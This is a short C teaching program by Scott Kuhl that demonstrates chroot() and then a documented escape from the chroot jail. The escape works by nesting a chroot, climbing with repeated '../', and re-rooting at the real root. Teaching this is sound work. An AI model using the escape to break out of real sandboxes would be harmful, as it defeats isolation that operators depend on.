// Scott Kuhl
//
// Demonstration of chroot and how to break out of it. Make sure you
// run "./chroot" because most Linux systems have a chroot binary
// installed in a commonly-used path that your shell may use
// instead. On Ubuntu 14.04, the "chroot" program (which calls the
// chroot() function) in /usr/sbin/chroot
//
// For more information, see:
// https://lwn.net/Articles/252794/
// http://www.lst.de/~okir/blackhats/node122.html

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

int main(void)
{
	char buf[1024];
	getcwd(buf, 1024);
	printf("current working directory: %s\n", buf);


	// The file "/Makefile" probably doesn't exist on your computer.
	struct stat statBuf;
	if(stat("/Makefile", &statBuf) == -1)
		perror("stat(/Makefile)");
	else
		printf("/Makefile");
	
	if(chroot(buf) == -1) // make the current directory be /
	{
		perror("chroot");
		printf("Have you tried running this as root?\n");
		exit(EXIT_FAILURE);
	}

	// From this point on, this program will think that the root
	// directory "/" is this directory!
	getcwd(buf, 1024);
	printf("current working directory: %s\n", buf);
	// The file "/Makefile" should exist!
	if(stat("/Makefile", &statBuf) == -1)
		perror("stat(/Makefile)");
	else
		printf("found /Makefile\n");

	/* It is possible to break out of chroot using this approach. This
	 * general approach is not a secret and is documented in the
	 * chroot man page. */
	printf("Breaking out of chroot....\n");
	mkdir("chroot.temp", 0777);
	chroot("chroot.temp"); // Now we are not inside of the new root!?!
	rmdir("chroot.temp"); // cleanup after ourselves

	getcwd(buf, 1024);
	printf("current working directory (escape part 1): %s\n", buf);

	// Try to cd into the real root.
	chdir("../../../../../../../../../../../../../../");

	getcwd(buf, 1024);
	printf("current working directory (escape part 2): %s\n", buf);

	// Did we get out of the chroot?
	chroot(".");
	getcwd(buf, 1024);
	printf("current working directory (escape part 3): %s\n", buf);

	// List the files in this directory so you can verify that we got
	// out.
	printf("listing of files in this directory\n");
	execlp("ls", "/", NULL);
}
